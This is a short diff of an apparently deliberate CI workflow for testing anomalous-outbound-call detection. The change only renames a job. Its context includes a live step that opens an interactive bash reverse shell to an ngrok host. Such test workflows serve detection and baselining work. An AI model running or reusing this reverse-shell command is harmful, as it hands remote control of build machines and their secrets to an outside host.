@@ -190,7 +190,7 @@ jobs:
 
     - run: |
           bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1" 
-  anomalous-outbound-call:
+  anomalous-outbound-calls:
     # Baseline Generation Script:
     # To quickly run this job 100 times for baseline generation, use this script:
     #
